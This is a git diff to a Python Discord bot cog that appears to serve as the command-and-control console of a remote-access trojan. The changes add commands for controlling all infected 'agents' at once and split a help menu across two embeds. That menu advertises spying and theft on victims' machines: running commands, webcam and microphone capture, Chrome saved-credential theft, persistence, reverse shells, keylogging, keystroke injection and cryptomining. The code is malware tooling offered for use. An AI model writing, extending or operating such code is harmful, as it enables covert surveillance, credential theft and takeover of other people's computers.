@@ -6,7 +6,7 @@ import discord
 from discord.ext import commands
 from code.discord.bot import BOT
 from code.discord.cogs.allowedGuild import is_allowed_guild
-from code.discord.interactButton import InteractButton
+from code.discord.cogs.interactButton import InteractButton
 from libraries import maciassdopia, keylogger
 
 
@@ -17,7 +17,6 @@ class HybridCommands(commands.Cog):
         self.guild = bot.guild
         self.id = bot.id
         self.keylog_webhook = bot.keylog_webhook
-        self.current_agent = 0
 
 
     @commands.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
@@ -40,7 +39,18 @@ class HybridCommands(commands.Cog):
     async def interact_all(self, ctx:commands.Context):
         self.bot.active_interactions = True
         my_embed = discord.Embed(
-            title = f"Interacting with all agents",
+            title = f"Interacting with all agents\nUse commands with prefix ` ! ` to use them for all agents\nRemoember to use `/interact-clear` after usage!",
+            color = 0x00FF00
+        )
+        await ctx.reply(embed = my_embed)
+
+
+    @commands.hybrid_command(name = "interact-clear", with_app_command = True, description = "Interact with all agents")
+    @is_allowed_guild
+    async def interact_clear(self, ctx:commands.Context):
+        self.bot.active_interactions = False
+        my_embed = discord.Embed(
+            title = f"Cloasing interactions with all Agents",
             color = 0x00FF00
         )
         await ctx.reply(embed = my_embed)
@@ -49,7 +59,7 @@ class HybridCommands(commands.Cog):
     @commands.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
     @is_allowed_guild
     async def background(self, ctx:commands.Context):
-        self.current_agent = 0
+        self.bot.active_interactions = False
         my_embed = discord.Embed(
             title = f"Background Agent",
             color = 0x00FF00
@@ -216,7 +226,7 @@ class HybridCommands(commands.Cog):
     async def ls(self, ctx: commands.Context):
         if ctx.interaction:
             my_embed = discord.Embed(
-                title = f"Please use **!ls {self.id}** instead of the slash command",
+                title = f"Please use **!ls** instead of the slash command",
                 color = 0xFF0000
             )
             await ctx.reply(embed = my_embed)
@@ -462,32 +472,39 @@ class HybridCommands(commands.Cog):
     @commands.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
     @is_allowed_guild
     async def help(self, ctx:commands.Context):
-        my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
-        my_embed.add_field(name="/help", value="Shows this menu", inline=False)
-        my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
-        my_embed.add_field(name="/background", value="Background your current agent", inline=False)
-        my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
-        my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
-        my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
-        my_embed.add_field(name="/process ", value="Get a list of all running processes", inline=False)
-        my_embed.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
-        my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
-        my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
-        my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
-        my_embed.add_field(name="!ls", value="Get a list of all active agents", inline=False)
-        my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
-        my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
-        my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
-        my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
-        my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
-        my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
-        my_embed.add_field(name="/write <text>", value="Write specified text on the target computer (As it's keyboard)", inline=False)
-        my_embed.add_field(name="/press <key>", value="Press specified key (`enter` or just letters like `a`) on the target computer (As it's keyboard)", inline=False)
-        my_embed.add_field(name="/message <text>", value="Show a popup message in the center of the Agent screen with specified text", inline=False)
-        my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
-        my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
-        my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
-        await ctx.reply(embed = my_embed)
+        my_embed_1 = discord.Embed(title=f"Help Menu", color=0x00FF00)
+        my_embed_1.add_field(name="/help", value="Shows this menu, use help-mining for cryptomining help", inline=False)
+        my_embed_1.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
+        my_embed_1.add_field(name="/interact-all", value="Interact with all agents", inline=False)
+        my_embed_1.add_field(name="/interact-clear", value="Close interaction with all agents", inline=False)
+        my_embed_1.add_field(name="/background", value="Background your current agent", inline=False)
+        my_embed_1.add_field(name="/cmd <command>", value="Run command on target", inline=False)
+        my_embed_1.add_field(name="/cd <path>", value="Change current directory", inline=False)
+        my_embed_1.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
+        my_embed_1.add_field(name="/process ", value="Get a list of all running processes", inline=False)
+        my_embed_1.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
+        my_embed_1.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
+        my_embed_1.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
+        my_embed_1.add_field(name="/persistent ", value="Enable persistence", inline=False)
+        my_embed_1.add_field(name="!ls", value="Get a list of all active agents", inline=False)
+        my_embed_1.add_field(name="/download <path>", value="Download file from agent", inline=False)
+        my_embed_1.add_field(name="/terminate ", value="Terminate the session ", inline=False)
+        my_embed_1.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
+        my_embed_1.add_field(name="/location ", value="Get the location of the target machine", inline=False)
+        my_embed_1.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
+        my_embed_1.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
+        my_embed_1.add_field(name="/write <text>", value="Write specified text on the target computer (As it's keyboard)", inline=False)
+        my_embed_1.add_field(name="/press <key>", value="Press specified key (`enter` or just letters like `a`) on the target computer (As it's keyboard)", inline=False)
+        my_embed_1.add_field(name="/message <text>", value="Show a popup message in the center of the Agent screen with specified text", inline=False)
+        my_embed_1.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
+        
+        # Second embed because discord limit fields to 25
+        my_embed_2 = discord.Embed(color=0x00FF00)
+        my_embed_2.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
+        my_embed_2.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
+        
+        await ctx.reply(embed = my_embed_1)
+        await ctx.reply(embed = my_embed_2)
 
 
 async def setup(bot:BOT):
